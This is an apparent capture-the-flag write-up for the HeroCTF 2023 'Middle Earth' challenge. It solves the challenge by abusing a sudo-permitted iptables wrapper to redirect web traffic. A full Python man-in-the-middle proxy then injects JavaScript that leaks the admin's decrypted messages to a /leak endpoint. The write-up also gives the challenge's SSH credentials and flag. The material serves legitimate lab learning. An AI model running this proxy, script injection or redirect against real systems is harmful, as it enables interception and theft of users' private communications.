<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# HeroCTF 2023 – Middle Earth (Web / Crypto / System)

**Category:** Web / Crypto / System  
**Difficulty:** Medium  
**Flag:** `Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}`  

---

## 1. Challenge Description

We’re given:

- A web app:  
  `http://dyn03.heroctf.fr:13892`
- SSH access:  
  ```bash
  ssh -p 11657 aragorn@dyn03.heroctf.fr
  # password: hobbit
  ```
- Flavour text about *“end-to-end encryption”* and asymmetric crypto.
- Story detail: **Saruman** is using the app as **admin**.

**Goal:**  
Break the “secure” mail system and recover the flag `Hero{...}`.

---

## 2. First Look at the Web App

Visiting:

```text
http://dyn03.heroctf.fr:13892
```

Logging in with:

```text
Username: aragorn
Password: hobbit
```

We see a very simple inbox UI:

- A **Session Encryption Key** (an RSA public key in PEM format)
- A button: **Request Encrypted Message**
- A section displaying something like:

> New Encrypted Message  
> From: server@secure.mail  
> `<ciphertext in base64>`  
> `[Decrypt]`

When we click **Decrypt**, the ciphertext is decrypted **client-side** and replaced with a plaintext quote, for example:

> Only put off until tomorrow what you are willing to die having left undone. ~Pablo Picasso

### Key Observations

- The app is served over **HTTP**, not HTTPS.
- All crypto (key generation, encryption, decryption) is done in **JavaScript in the browser**.
- The server only ever sees:
  - The session **public** key
  - Encrypted messages for that key

The flavour text heavily hints:

> Bilbo thinks this is end-to-end encryption, but we have server access.

So instead of attacking RSA or the crypto directly, the vulnerability is **architectural**:

> If the server can modify the JavaScript, it can break any “end-to-end” encryption implemented in that JavaScript.

Our job: leverage server-side access to undermine this so-called “end-to-end” encryption.

---

## 3. Getting System Access as `aragorn`

We’re given SSH access, so we log in:

```bash
ssh -p 11657 aragorn@dyn03.heroctf.fr
# password: hobbit
```

Basic recon:

```bash
whoami        # aragorn
hostname      # middle_earth
ls /
ls /var
ls /opt
ls /home
```

We notice:

- `/challenge` exists but is not accessible:

  ```bash
  cd /challenge
  # Permission denied
  ```

- `/opt` contains an interesting script:

  ```bash
  cd /opt
  ls -l
  # -rwxrwxr-x 1 root root 2426 Nov 27 11:03 w_iptables.sh
  ```

Check `sudo` rights:

```bash
sudo -l
```

Relevant output:

```text
User aragorn may run the following commands on middle_earth:
    (root) /opt/w_iptables.sh
```

So:

- We **cannot** run arbitrary commands as root.
- We **can** run `/opt/w_iptables.sh` as root with `sudo`.

This will be our escalation vector.

---

## 4. Understanding `/opt/w_iptables.sh`

View the script:

```bash
cd /opt
sed -n '1,160p' w_iptables.sh
```

Summarized content:

```bash
#!/bin/bash

APPEND_OR_DELETE=$1
CHAIN=$2
PROTOCOL=$3
PORT_SRC=$4
PORT_DST=$5
ACTION=$6

ALLOWED_APPEND_OR_DELETE=("A" "D")
ALLOWED_CHAINS=("INPUT" "OUTPUT" "FORWARD" "PREROUTING" "POSTROUTING")
ALLOWED_PROTOCOLS=("tcp" "udp")
ALLOWED_ACTIONS=("ACCEPT" "DROP" "REJECT" "MASQUERADE" "REDIRECT")

# ... validation logic ...

if [[ "$ACTION" == "REDIRECT" ]]; then
    /usr/sbin/iptables -t nat -$APPEND_OR_DELETE "$CHAIN" -p "$PROTOCOL" --dport "$PORT_SRC" -j "$ACTION" --to-ports "$PORT_DST"
elif [[ "$ACTION" == "MASQUERADE" ]]; then
    /usr/sbin/iptables -t nat -$APPEND_OR_DELETE "$CHAIN" -j "$ACTION"
else
    /usr/sbin/iptables -$APPEND_OR_DELETE "$CHAIN" -p "$PROTOCOL" --dport "$PORT_SRC" -j "$ACTION"
fi
```

Constraints (from the validation):

- Only certain values allowed for:
  - `APPEND_OR_DELETE` → `A` / `D`
  - `CHAIN` → `INPUT` / `OUTPUT` / `FORWARD` / `PREROUTING` / `POSTROUTING`
  - `PROTOCOL` → `tcp` / `udp`
  - `ACTION` → `ACCEPT` / `DROP` / `REJECT` / `MASQUERADE` / `REDIRECT`
- Ports must be within allowed range (1–2000).

**Key insight:**

We have a controlled `sudo` that lets us add/remove iptables rules, including **NAT REDIRECT** (`-t nat -j REDIRECT`) – but limited to low ports.

That is still enough for a **root-enabled network MITM**.

---

## 5. Strategy: MITM + JS Injection

We **cannot** modify `/challenge` or the server-side templates directly as user `aragorn`.

But we **can**:

1. Run a small **Python HTTP proxy** (MITM) on a port we control, e.g. `1337` (within allowed range).
2. Use `w_iptables.sh` with `REDIRECT` to route HTTP traffic destined to the backend through our proxy.
3. In the proxy:
   - Inject a `<script>` tag into HTML responses.
   - The injected JS watches the DOM, and whenever decrypted plaintext appears:
     - It exfiltrates it via a request like:  
       `/leak?d=<base64-encoded or URL-encoded plaintext>`
   - The proxy logs whatever is sent to `/leak`.

Result:

- When **Saruman** (admin) decrypts his messages in the browser, his “end-to-end” decrypted plaintext (including the flag) will be exfiltrated and printed in our MITM logs.

---

## 6. Building the Python MITM Proxy

Create the MITM script on the box:

```bash
cat << 'EOF' > /tmp/mitm.py
import http.server, socketserver, http.client, urllib.parse, sys

BACKEND_HOST = "127.0.0.1"
BACKEND_PORT = 80          # internal backend (assumed)
LISTEN_PORT  = 1337        # our MITM

INJECT_JS = '<script>(function(){function leak(t){if(!t)return;t=t.trim();if(!t)return;try{var i=new Image();i.src="/leak?d="+encodeURIComponent(t);}catch(e){}}var o=new MutationObserver(function(ms){ms.forEach(function(m){m.addedNodes.forEach(function(n){try{if(n.nodeType===Node.TEXT_NODE){leak(n.nodeValue);}else if(n.textContent){leak(n.textContent);}}catch(e){}});});});function s(){if(!document.body)return;o.observe(document.body,{childList:true,subtree:true});}if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",s);}else{s();}})();</script>'

class Proxy(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("%s - - [%s] %s
" %
                         (self.client_address[0],
                          self.log_date_time_string(),
                          fmt % args))

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        # Exfil endpoint: /leak?d=...
        if parsed.path == "/leak":
            qs = urllib.parse.parse_qs(parsed.query)
            data = qs.get("d", [""])[0]
            if data:
                print("[LEAK]", data)
                sys.stdout.flush()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
            return
        self._proxy()

    def do_POST(self):
        self._proxy()

    def _proxy(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length) if length > 0 else None

        conn = http.client.HTTPConnection(BACKEND_HOST, BACKEND_PORT, timeout=10)
        headers = {k: v for k, v in self.headers.items()}

        try:
            conn.request(self.command, self.path, body=body, headers=headers)
            res = conn.getresponse()
        except Exception as e:
            self.send_error(502, "Upstream error: %s" % e)
            return

        resp_body = res.read()
        status = res.status
        reason = res.reason
        resp_headers = res.getheaders()

        content_type = ""
        for k, v in resp_headers:
            if k.lower() == "content-type":
                content_type = v
                break

        # Inject our JS into HTML bodies
        if "text/html" in content_type and b"</body>" in resp_body:
            inject_bytes = INJECT_JS.encode()
            new_body = resp_body.replace(b"</body>", inject_bytes + b"</body>", 1)
            diff = len(new_body) - len(resp_body)
            resp_body = new_body
            new_headers = []
            for k, v in resp_headers:
                if k.lower() == "content-length":
                    try:
                        v = str(int(v) + diff)
                    except ValueError:
                        v = str(len(resp_body))
                new_headers.append((k, v))
            resp_headers = new_headers

        self.send_response(status, reason)
        for k, v in resp_headers:
            if k.lower() in ("connection", "keep-alive", "proxy-authenticate",
                             "proxy-authorization", "te", "trailers",
                             "transfer-encoding", "upgrade"):
                continue
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(resp_body)

def main():
    with socketserver.ThreadingTCPServer(("", LISTEN_PORT), Proxy) as httpd:
        print("[*] MITM listening on port", LISTEN_PORT)
        print("[*] Proxying to %s:%d" % (BACKEND_HOST, BACKEND_PORT))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Stopping MITM")

if __name__ == "__main__":
    main()
EOF
```

What this proxy does:

- Listens on `0.0.0.0:1337`
- Proxies all HTTP requests to `127.0.0.1:80` (the internal backend)
- For responses with:
  - `Content-Type: text/html`
  - A `</body>` tag
- It injects our `INJECT_JS` before `</body>`.
- It exposes `/leak?d=...`:
  - Logs any `d` parameter as `[LEAK] <data>`

---

## 7. Redirecting HTTP Traffic via the Sudo Wrapper

We now hook incoming HTTP traffic to our proxy.

Assumption: external traffic hits port `13892` → DNAT → internal port `80`.  
We’ll insert ourselves into that flow using **NAT PREROUTING**:

```bash
sudo /opt/w_iptables.sh A PREROUTING tcp 80 1337 REDIRECT
```

This effectively runs (as root):

```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 1337
```

Now any HTTP request hitting port 80 is transparently rerouted to our MITM proxy on port 1337, which forwards it to the real backend.

---

## 8. Running the MITM and Verifying

Start the MITM:

```bash
python3 /tmp/mitm.py
```

Output:

```text
[*] MITM listening on port 1337
[*] Proxying to 127.0.0.1:80
```

From your own machine, browse again to:

```text
http://dyn03.heroctf.fr:13892
```

Login as `aragorn:hobbit`, then:

1. Click **Request Encrypted Message**
2. Click **Decrypt**

On the server, in the `mitm.py` output, you should see something like:

```text
10.99.xx.xx - - [date] "POST /request_encrypted HTTP/1.1" 200 -
[LEAK] New Encrypted Message
                        From: server@secure.mail

                    Decrypt

                cL8vUcV...
[LEAK] Decrypted
[LEAK] When you stop chasing the wrong things you give the right things a chance to catch you. ~Lolly Daskal
```

This confirms:

- Our injected JS is executed in the victim’s browser.
- It sees the decrypted plaintext in the DOM.
- It calls `/leak?d=...`, which our MITM logs.

Exactly what we need for capturing Saruman’s admin messages.

---

## 9. Catching the Admin’s Flag

After some time (or when the admin/bot processes their messages), we eventually see a new leak in the proxy output:

```text
[LEAK] Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}
```

That matches the expected flag format.

---

## 10. Final Flag

```text
Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}
```

